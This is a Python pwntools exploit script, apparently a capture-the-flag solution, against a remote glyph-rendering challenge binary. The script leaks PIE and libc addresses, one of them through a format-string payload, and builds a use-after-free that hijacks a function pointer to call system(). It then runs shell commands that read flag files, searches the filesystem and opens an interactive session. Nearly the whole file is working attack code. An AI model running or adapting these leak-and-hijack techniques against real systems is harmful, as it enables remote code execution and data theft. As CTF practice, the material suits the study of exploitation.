#!/usr/bin/env python3
from pwn import *

PORT = 9001
HOST = "15.235.202.47"

elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# context.log_level = 'debug'

SAFE_FILTER_OFF = 0x32490
G_OFF           = 0x32020
PRINTF_CHK_PLT  = 0x4640

SYSTEM_OFF      = libc.sym.system    # 0x58750
UNSETENV_OFF    = libc.sym.unsetenv  # 0x4ada0

MAGIC = b'GYPHFLIF'
FILTER_OFF = 0x80
BAD = b'\x00\n'


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
        ''')


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        # Chạy env sạch để giống remote hơn
        return process(['./chall_patched'], env={})


def ru(x=b'glyph> '):
    return p.recvuntil(x)


def sl(x):
    p.sendline(x)


def cmd(x):
    sl(x)
    return ru()


def hx(data: bytes) -> bytes:
    return data.hex().encode()


def has_bad_addr(addr: int) -> bool:
    return any(c in BAD for c in p64(addr)[:6])


def leak_pie():
    ru()

    cmd(b'load abc')
    cmd(b'style foo')
    cmd(b'layout')
    cmd(b'paint')

    out = cmd(b'inspect paint raw')
    raw_hex = out.split(b'raw=')[1].split(b'\n')[0]
    raw = bytes.fromhex(raw_hex.decode())

    ksafe = u64(raw[0x10:0x18])
    pie = ksafe - SAFE_FILTER_OFF

    log.success(f'kSafeFilter = {hex(ksafe)}')
    log.success(f'PIE base    = {hex(pie)}')
    return pie


def leak_libc(pie):
    printf_chk = pie + PRINTF_CHK_PLT
    g_addr = pie + G_OFF

    if has_bad_addr(printf_chk):
        log.failure(f'Bad __printf_chk@plt bytes: {p64(printf_chk)[:6].hex()}')
        raise EOFError

    cmd(b'reset')

    fmt = b'.'.join([b'%p'] * 20)
    payload = fmt + b'A' * (FILTER_OFF - len(fmt)) + MAGIC + p64(printf_chk)[:6]

    prof = bytearray(b'B' * 0x50)
    prof[0x10:0x18] = p64(g_addr + FILTER_OFF)

    cmd(b'load ' + payload)
    cmd(b'style one')
    cmd(b'layout')
    cmd(b'paint')
    cmd(b'style two')
    cmd(b'optimize')
    cmd(b'profile add ' + hx(prof))

    out = cmd(b'render')
    leak_part = out.split(b'glyph>')[0].strip()

    leaks = []
    for x in leak_part.split(b'.'):
        try:
            leaks.append(0 if x == b'(nil)' else int(x, 16))
        except ValueError:
            pass

    log.info('leaks:')
    for i, x in enumerate(leaks):
        log.info(f'  [{i}] = {hex(x)}')

    candidates = []

    for x in leaks:
        base = x - 0x203b20
        if base > 0 and base & 0xfff == 0:
            candidates.append(('clean-env', x, base))

    for x in leaks:
        base = x - 0x1bdc0
        if base > 0 and base & 0xfff == 0:
            candidates.append(('dirty-env', x, base))

    if not candidates:
        log.failure('No valid libc candidate found')
        raise EOFError

    kind, libc_leak, libc_base = candidates[0]

    log.success(f'libc leak kind = {kind}')
    log.success(f'libc leak      = {hex(libc_leak)}')
    log.success(f'libc base      = {hex(libc_base)}')
    return libc_base


def build_uaf_call(g_addr, func_addr, arg, tag=b'a'):
    assert len(arg) < FILTER_OFF
    assert not any(c in BAD for c in arg)
    assert not has_bad_addr(func_addr), f'bad func addr: {hex(func_addr)}'

    cmd(b'reset')

    setup = b'A' * FILTER_OFF + MAGIC + p64(func_addr)[:6]
    fake_filter = g_addr + FILTER_OFF

    prof = bytearray(b'D' * 0x50)
    prof[0x10:0x18] = p64(fake_filter)

    cmd(b'load ' + setup)
    cmd(b'load ' + arg)

    cmd(b'style ' + tag + b'1')
    cmd(b'layout')
    cmd(b'paint')
    cmd(b'style ' + tag + b'2')
    cmd(b'optimize')
    cmd(b'profile add ' + hx(prof))

    return cmd(b'render')


while True:
    p = conn()

    try:
        pie = leak_pie()
        g_addr = pie + G_OFF

        libc_base = leak_libc(pie)

        system_addr = libc_base + SYSTEM_OFF
        unsetenv_addr = libc_base + UNSETENV_OFF

        log.success(f'system   = {hex(system_addr)}')
        log.success(f'unsetenv = {hex(unsetenv_addr)}')

        if has_bad_addr(system_addr) or has_bad_addr(unsetenv_addr):
            log.warning('Bad address bytes because of ASLR, reconnecting/restarting...')
            p.close()
            continue

        # Không hại gì khi remote không có biến này.
        build_uaf_call(g_addr, unsetenv_addr, b'LD_LIBRARY_PATH', b'u')

        commands = [
            b'cat flag* 2>/dev/null',
            b'cat /flag* 2>/dev/null',
            b'cat /home/*/flag* 2>/dev/null',
            b'cat /app/flag* 2>/dev/null',
            b'find / -maxdepth 3 -iname "*flag*" 2>/dev/null',
        ]

        for i, c in enumerate(commands):
            log.info(f'Running command: {c!r}')
            out = build_uaf_call(g_addr, system_addr, c, f'f{i}'.encode())
            print(out.decode(errors='ignore'))

        p.interactive()
        break

    except EOFError:
        p.close()
        continue